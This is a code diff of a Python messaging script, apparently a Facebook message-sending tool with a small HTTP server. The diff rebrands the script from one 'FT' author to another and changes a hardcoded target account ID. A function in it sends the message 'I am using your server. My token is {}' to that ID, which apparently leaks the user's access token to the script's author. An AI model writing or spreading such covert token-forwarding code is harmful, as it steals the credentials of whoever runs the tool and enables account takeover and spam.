@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- THIS SERVER MADE BY FT RONY KING")
+          self.wfile.write(b"-- THIS SERVER MADE BY FT ANMOL BRAND")
 def execute_server():
       PORT = 4000
 
@@ -42,12 +42,12 @@ def send_initial_message():
       msg_template = "Hello Anmol sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "61563594825001"
+      target_id = "100069416707595"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + 'â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€FT RONY KING HERE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢')
+          print('\033[1;92m' + '•──────────────────────FT ANMOL KING HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -94,7 +94,7 @@ def send_messages_from_file():
           speed = int(file.read().strip())
 
       def liness():
-          print('\033[1;92m' + 'â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢')
+          print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
